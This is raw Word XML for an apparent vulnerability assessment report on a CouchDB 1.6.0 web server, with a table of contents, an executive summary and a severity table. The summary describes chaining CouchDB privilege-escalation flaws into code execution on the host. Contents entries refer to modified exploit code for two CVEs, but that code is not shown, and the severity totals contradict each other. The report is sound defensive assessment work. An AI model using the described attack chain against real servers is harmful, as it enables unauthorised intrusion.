                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392751 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>19</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52" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Modified Exploit Code For CVE-2017-12635</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392752 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>19</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53" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Modified Exploit Code For CVE-2017-12636</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392753 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>19</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54" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Appendix C:  Screenshots For Nessus &amp; Faraday</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392754 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>20</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55" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Appendix D:  Screenshots Of Exploited Web App</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392755 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>22</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="009D1794" w:rsidRDefault="007A53C5">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc143392756" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Appendix E:  OSINT / Phishing Results Data Used</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392756 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
          <w:r>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p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5" w:name="_Toc143392734"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Executive Summary</w:t>
      </w:r>
      <w:bookmarkEnd w:id="5"/>
    </w:p>
    <w:p w:rsidR="00B352B4" w:rsidRDefault="00B352B4">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This is the vulnerability assessment report for the </w:t>
      </w:r>
      <w:r w:rsidR="00BB2124">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>web server example.com with the private IP address for 10.10.10.10. After running with Nessus scan follow the policy_ns_q3. We have discovered these vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251659264" behindDoc="0" locked="0" layoutInCell="1" hidden="0" allowOverlap="1" wp14:anchorId="1E0FC441" wp14:editId="5DE8BB1E">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>left</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>1270</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="2428875" cy="1914525"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapSquare wrapText="bothSides" distT="0" distB="0" distL="114300" distR="114300"/>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rsidR="006A5651" w:rsidRDefault="006A5651" w:rsidP="006A5651">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The vulnerability testing result:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006A5651" w:rsidRDefault="006A5651" w:rsidP="006A5651">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>- Medium: 4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006A5651" w:rsidRDefault="00C016F1" w:rsidP="006A5651">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>- High: 3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006A5651" w:rsidRDefault="00C016F1" w:rsidP="006A5651">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>- Critical: 1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006A5651" w:rsidRPr="006A5651" w:rsidRDefault="006A5651" w:rsidP="006A5651">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>- Total Vulnerability: 55</w:t>
      </w:r>
    </w:p>
    <w:p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bookmarkStart w:id="6" w:name="_heading=h.3dy6vkm" w:colFirst="0" w:colLast="0"/>
      <w:bookmarkEnd w:id="6"/>
    </w:p>
    <w:p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rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00F20550" w:rsidRDefault="00F20550" w:rsidP="00F20550">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Because r</w:t>
      </w:r>
      <w:r w:rsidRPr="00F20550">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ecently, a phishing assessment was done, and the results revealed a need for a complete vulnerability audit for the company.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F20550">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Further, the company is moving its infrastructure to a different cloud provider, and management is concerned about any HIGH or CRITICAL vulnerabilities requiring immediate attention.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F20550" w:rsidRDefault="00F20550" w:rsidP="00F20550">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 That is the reason and the objective for this action of security assessment to identify weaknesses of the system of the Example Corp’s networks. From that results, we will have the correct action to secure our system.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F20550" w:rsidRDefault="00F20550" w:rsidP="00F20550">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For the result of the assessment, the main </w:t>
      </w:r>
      <w:r w:rsidR="00F636C2">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">component that causes most of the critical vulnerabilities is the service Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F636C2">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F636C2">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. We are currently using an old version of the service which is version 1.6.0 and this version has a lot of critical vulnerabilities that allow non-admin users to escalate their privileges to admin users not only that, there is another vulnerability that allows the admin user to gain privileges as the OS user. And by chaining these two vulnerabilities, a non-admin user can have access to execute code on the host instance.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F636C2" w:rsidRPr="00F20550" w:rsidRDefault="00F636C2" w:rsidP="00F20550">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:after="160" w:line="259"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What we will recommend is </w:t>
      </w:r>
      <w:r w:rsidR="000C2BBA">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">update the version of the Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to 3.2.3 or 3.3.2 since these two versions currently </w:t>
      </w:r>
      <w:r w:rsidR="000C2BBA">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>have</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0 </w:t>
      </w:r>
      <w:r w:rsidR="000C2BBA">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>vulnerabilities</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (using </w:t>
      </w:r>
      <w:r w:rsidR="000C2BBA">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">report from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>cvedetail</w:t>
      </w:r>
      <w:r w:rsidR="000C2BBA">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="00F636C2">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>https://www.cvedetails.com/version-list/45/19046/1/Apache-Couchdb.html</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="000C2BBA">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p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r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:bookmarkStart w:id="7" w:name="_Toc143392735"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>A Glance Through Target Security Posture</w:t>
      </w:r>
      <w:bookmarkEnd w:id="7"/>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="a0"/>
        <w:tblW w:w="89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218"/>
        <w:gridCol w:w="2258"/>
        <w:gridCol w:w="2214"/>
      </w:tblGrid>
      <w:tr w:rsidR="00C01D22" w:rsidTr="00C01D22">
        <w:trPr>
          <w:trHeight w:val="404"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2256" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="17365D"/>
          </w:tcPr>
          <w:p w:rsidR="00C01D22" w:rsidRDefault="00C01D22" w:rsidP="00BA78CE">
            <w:pPr>
              <w:pBdr>
                <w:top w:val="nil"/>
                <w:left w:val="nil"/>
                <w:bottom w:val="nil"/>
                <w:right w:val="nil"/>
                <w:between w:val="nil"/>
              </w:pBdr>
              <w:spacing w:before="120" w:after="120" w:line="259" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
                <w:b/>
                <w:color w:val="000000"/>
              </w:rPr>
            </w:pPr>
            <w:bookmarkStart w:id="8" w:name="_heading=h.4d34og8" w:colFirst="0" w:colLast="0"/>
            <w:bookmarkEnd w:id="8"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
                <w:b/>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>Total Findings</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2218" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
          </w:tcPr>
          <w:p w:rsidR="00C01D22" w:rsidRDefault="00C01D22" w:rsidP="00BA78CE">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Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2258" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
          </w:tcPr>
          <w:p w:rsidR="00C01D22" w:rsidRDefault="00C01D22" w:rsidP="00BA78CE">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High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
          </w:tcPr>
          <w:p w:rsidR="00C01D22" w:rsidRDefault="00C01D22" w:rsidP="00BA78CE">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Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C01D22" w:rsidTr="00C01D22">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2256" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00C01D22" w:rsidRDefault="00C01D22" w:rsidP="00BA78CE">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9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2218" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00C01D22" w:rsidRDefault="00C016F1" w:rsidP="00BA78CE">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1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2258" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00C01D22" w:rsidRDefault="00C016F1" w:rsidP="00BA78CE">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3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00C01D22" w:rsidRDefault="00C01D22" w:rsidP="00BA78CE">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4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
